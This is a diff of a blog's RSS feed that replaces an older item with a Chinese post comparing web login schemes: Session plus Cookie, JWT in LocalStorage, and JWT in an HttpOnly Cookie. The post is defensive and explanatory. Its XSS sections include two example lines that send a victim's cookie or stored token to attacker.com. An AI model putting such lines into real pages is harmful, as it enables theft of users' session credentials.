@@ -1,4 +1,218 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>软弹适中</title><description>个人博客网站</description><link>https://liushuai-man.github.io/</link><templateTheme>Firefly</templateTheme><templateThemeVersion>0.0.0</templateThemeVersion><templateThemeUrl>https://github.com/CuteLeaf/Firefly</templateThemeUrl><lastBuildDate>2026年6月7日 15:47:26</lastBuildDate><item><title>LangChain的核心以及工作流程思路分析</title><link>https://liushuai-man.github.io/my-blog/posts/langchain-work/</link><guid isPermaLink="true">https://liushuai-man.github.io/my-blog/posts/langchain-work/</guid><description>本文将重点介绍LangChain由哪些核心组成，以及其工作流程思路分析，同时提供一些实战案例与常见问题优化方案。</description><pubDate>Sun, 07 Jun 2026 00:00:00 GMT</pubDate><content:encoded>&lt;section&gt;&lt;h1&gt;一、LangChain简介&lt;a href=&quot;#一langchain简介&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;section&gt;&lt;h2&gt;1.1 什么是LangChain&lt;a href=&quot;#11-什么是langchain&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;LangChain是一个用于构建基于大语言模型（LLM）应用的开源框架，由Harrison Chase于2022年10月推出。它提供了一整套工具和抽象层，帮助开发者更便捷地将大模型与外部数据源、工具进行整合，构建复杂的AI应用。&lt;/p&gt;&lt;p&gt;LangChain的核心设计理念是”模块化”与”可组合性”——将LLM应用拆分为独立的组件（如提示词模板、记忆模块、工具调用），再通过链式调用将这些组件串联起来，形成完整的工作流程。&lt;/p&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;1.2 LangChain的核心定位与价值&lt;a href=&quot;#12-langchain的核心定位与价值&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;LangChain在AI应用开发中的定位可以归结为以下几点：&lt;/p&gt;&lt;p&gt;&lt;strong&gt;降低开发门槛&lt;/strong&gt;：封装了大模型交互的复杂逻辑，开发者无需关注底层Prompt构建、模型调用、重试机制等细节。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;提供标准接口&lt;/strong&gt;：定义了LLM、Tool、Memory、Retrieval等组件的统一抽象，使得不同服务商（OpenAI、Anthropic、开源模型）的模型可以无缝切换。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;支持复杂工作流&lt;/strong&gt;：通过Chain机制，将多个组件串联成处理复杂任务的流水线，支持RAG、Agent等高级场景。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;生态丰富&lt;/strong&gt;：拥有庞大的社区生态，提供了丰富的预置组件、模板和第三方集成。&lt;/p&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;1.3 LangChain适用场景与优势&lt;a href=&quot;#13-langchain适用场景与优势&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;LangChain适用于以下典型场景：&lt;/p&gt;&lt;ul&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>软弹适中</title><description>个人博客网站</description><link>https://liushuai-man.github.io/</link><templateTheme>Firefly</templateTheme><templateThemeVersion>0.0.0</templateThemeVersion><templateThemeUrl>https://github.com/CuteLeaf/Firefly</templateThemeUrl><lastBuildDate>2026年6月20日 15:08:43</lastBuildDate><item><title>登录注册-认证方案</title><link>https://liushuai-man.github.io/my-blog/posts/cookie-session/</link><guid isPermaLink="true">https://liushuai-man.github.io/my-blog/posts/cookie-session/</guid><description>开发中认证的方案</description><pubDate>Sat, 20 Jun 2026 00:00:00 GMT</pubDate><content:encoded>&lt;section&gt;&lt;h1&gt;前言&lt;a href=&quot;#前言&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;我在最近的项目写登录注册的时候，选择的是 JWT+Cookie 的方式进行认证。在之前我一直用的是 JWT+LocalStorage 的方案。所以我想借此机会深入了解一下在开发中，认证的几种方案，以及过程中我遇到的问题。&lt;/p&gt;&lt;/section&gt;
+&lt;section&gt;&lt;h1&gt;认证的必要性&lt;a href=&quot;#认证的必要性&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;在互联网应用中，用户认证是保障系统安全的第一道防线。没有可靠的认证机制，会导致以下风险：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;隐私泄露&lt;/strong&gt;：用户个人信息被非法访问&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据篡改&lt;/strong&gt;：攻击者以他人身份操作数据&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;财产损失&lt;/strong&gt;：涉及金钱的应用尤其危险&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;信任损害&lt;/strong&gt;：安全事件严重影响用户对产品的信任&lt;/li&gt;
+&lt;/ul&gt;&lt;section&gt;&lt;h2&gt;常见的网络攻击&lt;a href=&quot;#常见的网络攻击&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;section&gt;&lt;h3&gt;XSS（跨站脚本攻击）&lt;a href=&quot;#xss跨站脚本攻击&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;攻击者通过在页面注入恶意脚本，当其他用户访问时，脚本会读取其 Cookie、Token 等敏感信息。&lt;/p&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;// 恶意脚本示例&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;span&gt;document&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span&gt;write&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&apos;&amp;lt;img src=&quot;http://attacker.com?cookie=&apos;&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;document&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;&apos;&quot;&amp;gt;&apos;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;&lt;/section&gt;&lt;section&gt;&lt;h3&gt;CSRF（跨站请求伪造）&lt;a href=&quot;#csrf跨站请求伪造&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;攻击者诱导用户访问恶意页面，该页面自动以用户的身份发起请求，利用用户已登录的状态完成攻击。&lt;/p&gt;&lt;/section&gt;&lt;section&gt;&lt;h3&gt;Token 盗取&lt;a href=&quot;#token-盗取&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;通过 XSS 或其他手段获取存储在 localStorage 中的 Token。&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;
+&lt;section&gt;&lt;h1&gt;认证的三种方案&lt;a href=&quot;#认证的三种方案&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;section&gt;&lt;h2&gt;什么是 Session&lt;a href=&quot;#什么是-session&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Session（会话）是服务器端存储的用户会话数据。当用户登录成功后，服务器创建一个唯一的 Session ID，并将其返回给客户端。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;工作流程：&lt;/strong&gt;&lt;/p&gt;&lt;ol&gt;
+&lt;li&gt;用户登录，服务器验证身份&lt;/li&gt;
+&lt;li&gt;服务器创建 Session，存储用户信息&lt;/li&gt;
+&lt;li&gt;服务器返回 Session ID（通常通过 Cookie 传递）&lt;/li&gt;
+&lt;li&gt;后续请求，浏览器自动携带 Cookie&lt;/li&gt;
+&lt;li&gt;服务器通过 Session ID 查找用户信息&lt;/li&gt;
+&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;特点：&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;数据存储在服务器端，安全性高&lt;/li&gt;
+&lt;li&gt;需要服务器存储空间&lt;/li&gt;
+&lt;li&gt;依赖 Cookie 传递 Session ID&lt;/li&gt;
+&lt;/ul&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;什么是 Cookie&lt;a href=&quot;#什么是-cookie&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Cookie 是浏览器提供的存储机制，用于存储键值对数据。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;重要属性：&lt;/strong&gt;&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;属性&lt;/th&gt;&lt;th&gt;说明&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;name=value&lt;/code&gt;&lt;/td&gt;&lt;td&gt;存储的数据&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;HttpOnly&lt;/code&gt;&lt;/td&gt;&lt;td&gt;是否允许 JavaScript 访问（防 XSS）&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Secure&lt;/code&gt;&lt;/td&gt;&lt;td&gt;是否仅在 HTTPS 连接时发送&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;SameSite&lt;/code&gt;&lt;/td&gt;&lt;td&gt;防止 CSRF 攻击&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Expires/Max-Age&lt;/code&gt;&lt;/td&gt;&lt;td&gt;过期时间&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;什么是 JWT&lt;a href=&quot;#什么是-jwt&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;JWT（JSON Web Token）是一种开放标准，用于在各方之间安全地传输信息。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;结构：&lt;/strong&gt;&lt;/p&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;header.payload.signature&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;// 示例 JWT&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;span&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span&gt;eyJ1c2VySWQiOiIxMjM0NTYiLCJpYXQiOjE3MTkwMDAwMDB9&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;组成：&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Header&lt;/strong&gt;：包含令牌类型和签名算法&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Payload&lt;/strong&gt;：包含声明（claims），如用户 ID、过期时间&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Signature&lt;/strong&gt;：使用密钥对前两部分签名，确保数据完整性&lt;/li&gt;
+&lt;/ul&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;新手误解 Session/SessionStorage&lt;a href=&quot;#新手误解-sessionsessionstorage&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;存储位置&lt;/th&gt;&lt;th&gt;存储内容&lt;/th&gt;&lt;th&gt;生命周期&lt;/th&gt;&lt;th&gt;访问限制&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Session&lt;/td&gt;&lt;td&gt;服务器端的会话数据&lt;/td&gt;&lt;td&gt;服务器决定&lt;/td&gt;&lt;td&gt;仅服务器可访问&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;SessionStorage&lt;/td&gt;&lt;td&gt;浏览器端的键值对&lt;/td&gt;&lt;td&gt;标签页关闭后清除&lt;/td&gt;&lt;td&gt;仅当前标签页可访问&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;LocalStorage&lt;/td&gt;&lt;td&gt;浏览器端的键值对&lt;/td&gt;&lt;td&gt;永久（手动清除）&lt;/td&gt;&lt;td&gt;同源所有标签页共享&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;常见误解：&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;❌ SessionStorage 是 Session 的客户端存储&lt;/li&gt;
+&lt;li&gt;❌ Session 可以像 LocalStorage 一样在浏览器查看&lt;/li&gt;
+&lt;li&gt;✅ Session 完全由服务器管理，客户端只持有 ID&lt;/li&gt;
+&lt;/ul&gt;&lt;/section&gt;&lt;/section&gt;
+&lt;section&gt;&lt;h1&gt;Session + Cookie（传统方案）&lt;a href=&quot;#session--cookie传统方案&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;这是最经典的身份认证方案，历史悠久，广泛应用于传统 Web 应用。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;工作流程：&lt;/strong&gt;&lt;/p&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;用户登录 → 服务器验证 → 创建 Session → 返回 Cookie(SessionId)&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;span&gt;                                      &lt;/span&gt;&lt;/span&gt;&lt;span&gt;↓&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;3&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;浏览器请求 → 自动携带 Cookie → 服务器验证 SessionId → 获取用户信息 → 处理请求&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;优缺点：&lt;/strong&gt;&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;优点&lt;/th&gt;&lt;th&gt;缺点&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;服务器控制，安全性高&lt;/td&gt;&lt;td&gt;服务器压力大（需要存储 Session）&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;适合分布式部署&lt;/td&gt;&lt;td&gt;需要额外的存储介质（Redis/Memcached）&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;可快速销毁会话&lt;/td&gt;&lt;td&gt;依赖 Cookie，限制跨域场景&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;适用场景：&lt;/strong&gt; 传统的服务端渲染应用（如电商后台、cms 系统）&lt;/p&gt;&lt;/section&gt;
+&lt;section&gt;&lt;h1&gt;JWT + LocalStorage&lt;a href=&quot;#jwt--localstorage&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;前端单页应用（SPA）时代的主流方案之一。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;工作流程：&lt;/strong&gt;&lt;/p&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;用户登录 → 服务器验证 → 生成 JWT → 返回给前端&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;span&gt;                                      &lt;/span&gt;&lt;/span&gt;&lt;span&gt;↓&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;3&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;前端存储到 LocalStorage → 后续请求放在 Authorization Header&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;4&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;span&gt;                          &lt;/span&gt;&lt;/span&gt;&lt;span&gt;Authorization: Bearer &amp;lt;token&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;优缺点：&lt;/strong&gt;&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;优点&lt;/th&gt;&lt;th&gt;缺点&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;无状态，服务器压力小&lt;/td&gt;&lt;td&gt;Token 存储在 LocalStorage，易受 XSS 攻击&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;跨域友好&lt;/td&gt;&lt;td&gt;无法主动失效（只能等过期）&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;适合移动端和前后端分离&lt;/td&gt;&lt;td&gt;Token 体积较大，增加请求负担&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;安全问题：&lt;/strong&gt;&lt;/p&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;// XSS 攻击可能窃取 Token&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;const&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;stolen&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;localStorage&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span&gt;getItem&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&apos;token&apos;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;3&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;// 发送给攻击者服务器&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;4&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;fetch&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&apos;http://attacker.com?token=&apos;&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;stolen&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;&lt;/section&gt;
+&lt;section&gt;&lt;h1&gt;JWT + HttpOnly Cookie（推荐方案）&lt;a href=&quot;#jwt--httponly-cookie推荐方案&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;这是目前较为安全的方案，结合了两者的优点。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;工作流程：&lt;/strong&gt;&lt;/p&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;用户登录 → 服务器验证 → 生成 JWT → 设置 HttpOnly Cookie（Secure + SameSite）&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;span&gt;                                      &lt;/span&gt;&lt;/span&gt;&lt;span&gt;↓&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;3&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;浏览器请求 → 自动携带 Cookie（JavaScript 无法访问）→ 服务器验证 → 处理请求&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;安全措施：&lt;/strong&gt;&lt;/p&gt;&lt;div&gt;&lt;figure&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span&gt;Set-Cookie&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;属性&lt;/th&gt;&lt;th&gt;作用&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;HttpOnly&lt;/code&gt;&lt;/td&gt;&lt;td&gt;防止 JavaScript 访问，无法被 XSS 窃取&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Secure&lt;/code&gt;&lt;/td&gt;&lt;td&gt;仅在 HTTPS 连接时传输&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;SameSite=Strict&lt;/code&gt;&lt;/td&gt;&lt;td&gt;完全禁止跨站请求携带&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;SameSite=Lax&lt;/code&gt;&lt;/td&gt;&lt;td&gt;允许导航请求携带，阻止 POST 等请求&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;优缺点：&lt;/strong&gt;&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;优点&lt;/th&gt;&lt;th&gt;缺点&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;安全性高，防 XSS&lt;/td&gt;&lt;td&gt;配置相对复杂&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;无需前端存储&lt;/td&gt;&lt;td&gt;依赖 Cookie，跨域需特殊处理&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;自动随请求发送&lt;/td&gt;&lt;td&gt;Token 刷新策略需要单独处理&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;适用场景：&lt;/strong&gt; 前后端分离应用、对安全性要求高的系统&lt;/p&gt;&lt;/section&gt;
+&lt;section&gt;&lt;h1&gt;总结&lt;a href=&quot;#总结&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;section&gt;&lt;h2&gt;方案对比&lt;a href=&quot;#方案对比&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;方案&lt;/th&gt;&lt;th&gt;安全性&lt;/th&gt;&lt;th&gt;复杂度&lt;/th&gt;&lt;th&gt;服务器压力&lt;/th&gt;&lt;th&gt;适用场景&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Session + Cookie&lt;/td&gt;&lt;td&gt;⭐⭐⭐⭐&lt;/td&gt;&lt;td&gt;⭐⭐&lt;/td&gt;&lt;td&gt;⭐⭐⭐⭐&lt;/td&gt;&lt;td&gt;传统服务端渲染应用&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;JWT + LocalStorage&lt;/td&gt;&lt;td&gt;⭐⭐&lt;/td&gt;&lt;td&gt;⭐⭐&lt;/td&gt;&lt;td&gt;⭐⭐&lt;/td&gt;&lt;td&gt;快速原型、演示项目&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;JWT + HttpOnly Cookie&lt;/td&gt;&lt;td&gt;⭐⭐⭐⭐⭐&lt;/td&gt;&lt;td&gt;⭐⭐⭐&lt;/td&gt;&lt;td&gt;⭐⭐&lt;/td&gt;&lt;td&gt;前后端分离应用（推荐）&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;实践建议&lt;a href=&quot;#实践建议&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;优先选择 HttpOnly Cookie&lt;/strong&gt;：除非有特殊需求，否则不要把 Token 放在 LocalStorage&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;做好 XSS 防护&lt;/strong&gt;：即使使用 HttpOnly Cookie，前端代码也要防止 XSS&lt;/li&gt;
